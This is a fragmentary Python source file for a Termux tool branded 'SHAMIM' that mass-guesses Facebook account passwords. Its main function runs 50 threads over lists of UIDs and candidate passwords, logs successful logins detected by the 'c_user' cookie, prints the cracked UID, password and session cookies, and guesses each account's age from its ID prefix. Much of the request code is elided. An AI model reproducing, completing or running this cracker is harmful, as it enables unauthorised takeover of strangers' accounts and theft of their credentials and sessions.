...
def o():
    ...
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    SHAMIM = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if SHAMIM == 'A':
        SHAMIM()
    if SHAMIM == 'B':
    ...
    if SHAMIM == 'C':
        ...
        return None
    if SHAMIM == 'D':
        os.system('xdg-open https://www.github.com/KgSHAMIM')
        return None
    if SHAMIM == 'E':
        os.system('exit')
        return None
...
today = date.today()
logo = ("""
\033[38;5;46m .d8888b.  888    888        d8888 888b     d888 8888888 888b     d888 
\033[38;5;46m d88P  Y88b 888    888       d88888 8888b   d8888   888   8888b   d8888 
\033[38;5;46m Y88b.      888    888      d88P888 88888b.d88888   888   88888b.d88888 
\033[38;5;46m "Y888b.   8888888888     d88P 888 888Y88888P888   888   888Y88888P888 
\033[38;5;46m "Y88b. 888    888    d88P  888 888 Y888P 888   888   888 Y888P 888 
\033[38;5;46m "888 888    888   d88P   888 888  Y8P  888   888   888  Y8P  888 
\033[38;5;46m Y88b  d88P 888    888  d8888888888 888   "   888   888   888   "   888 
\033[38;5;46m "Y8888P"  888    888 d88P     888 888       888 8888888 888       888 
 ...
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mTASHIM ISLAM SHAMIM   \033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mKgSHAMIM-CYBER             \033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195mDCT                  \033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m SHAMIM TERMUX HELPING ZONE....
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :SHAMIM = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :SHAMIM = ' ~> 2009'
        elif uid[:8] in ['10000000']        :SHAMIM = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:SHAMIM = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:SHAMIM = ' 2010'
        elif uid[:6] in ['100001']          :SHAMIM = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :SHAMIM = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :SHAMIM = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :SHAMIM = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :SHAMIM = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :SHAMIM = ' ~> 2015'
        elif uid[:5] in ['10001']           :SHAMIM = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :SHAMIM = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :SHAMIM = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :SHAMIM = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :SHAMIM = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:SHAMIM = ' ~> 2021'
        elif uid[:5] in ['10008']           :SHAMIM = ' ~>2022'
        elif uid[:5] in ['10009']           :SHAMIM = ' ~> 2023'
        else:SHAMIM=''
...
def SHAMIM():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mTASHIM ISLAM SHAMIM')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[SHAMIM-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [SHAMIM-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sSHAMIM\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
